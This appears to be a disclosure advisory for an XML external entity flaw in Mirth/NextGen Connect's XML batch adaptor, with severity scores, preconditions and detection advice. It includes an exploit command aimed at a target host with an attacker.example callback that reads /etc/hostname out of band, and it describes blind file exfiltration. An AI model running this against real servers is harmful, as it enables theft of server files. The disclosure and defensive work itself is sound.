# CVE-2026-82578: unauthenticated XXE in the XML Batch Adaptor

**CVSS 3.1:** 7.5 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)

**CVSS 4.0:** 8.7 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`)

**CWE:** CWE-611

**Tested:** NextGen Connect 4.5.2

**CISA guidance:** Mirth Connect 4.7.1 and earlier are affected; update to 4.7.2 or later.

When XML batch processing is enabled with `Element Name`, `Level`, or `XPath Query`
splitting, `XMLBatchAdaptor` evaluates XPath against the raw listener stream through
a default JAXP parser. It does not reject DOCTYPE declarations or external entities.
The separately created output transformer is hardened; the vulnerable operation is
the earlier input parse.

The PoC installs an ordinary HTTP Listener channel using XML `Element Name` batch
splitting. An unauthenticated attacker supplies the entire batch body, points the
parser at an external DTD, and receives the exact contents of a target-only canary
file through an OOB callback.

```bash
./poc/run.sh
```

The standalone attacker also accepts `--file-uri file:///path/to/file` and can run
without `--expect` when the value is not known in advance. This OOB transport is
intended for single-line text files; the lab wrapper keeps `--expect` enabled to
make the replay fail closed.

```bash
python3 poc/exploit.py \
  --target http://target.example:9997/ \
  --callback-host attacker.example \
  --file-uri file:///etc/hostname
```

The exploit exits nonzero unless the callback contains the expected canary. It does
not infer file read from a DNS hit or parser error. On 4.5.2 the triggering listener
request returns HTTP 500 after parsing fails, but the OOB callback has already
returned the exact file contents; the status code is not treated as proof.

## Practical attacker value

The HTTP 500 does not prevent exploitation: the file content has already left over
the callback. This makes the issue useful as a blind exfiltration path in environments
where an attacker can submit batch XML but cannot see stored messages or internal
parser output. The standalone client accepts a selected single-line target-local
`file:` URI, bounded by the Mirth service account's read permissions and server
egress. The packaged proof reads only a random canary. It does not demonstrate denial
of service, multiline-file recovery, or access to any production secret.

## Preconditions

- A deployed listener uses the XML data type with batch processing enabled.
- The split mode reaches the XPath-backed adaptor (`Element Name`, `Level`, or
  `XPath Query`). Batch processing is off by default.
- The attacker can reach the listener; OOB retrieval also requires server egress.

## Source

- [`XMLBatchAdaptor.java` line 64](https://github.com/nextgenhealthcare/connect/blob/6ce3a9f0e3d84841f0b1e07c2808cf0bdb3d0a78/server/src/com/mirth/connect/plugins/datatypes/xml/XMLBatchAdaptor.java#L64)
- [`XMLBatchAdaptor.java` lines 114-130](https://github.com/nextgenhealthcare/connect/blob/6ce3a9f0e3d84841f0b1e07c2808cf0bdb3d0a78/server/src/com/mirth/connect/plugins/datatypes/xml/XMLBatchAdaptor.java#L114-L130)
- [`XMLBatchAdaptor.java` lines 190-196](https://github.com/nextgenhealthcare/connect/blob/6ce3a9f0e3d84841f0b1e07c2808cf0bdb3d0a78/server/src/com/mirth/connect/plugins/datatypes/xml/XMLBatchAdaptor.java#L190-L196)

## Defensive use

Defenders can use the PoC to find XML channels with batch processing enabled, confirm
which split modes reach the vulnerable parser, validate egress controls, and build
correlation rules for inbound `DOCTYPE` content followed by Mirth-originated callbacks
or listener errors. Replaying it against a vendor-provided fixed build provides a
direct negative control without weakening normal batch-processing tests.
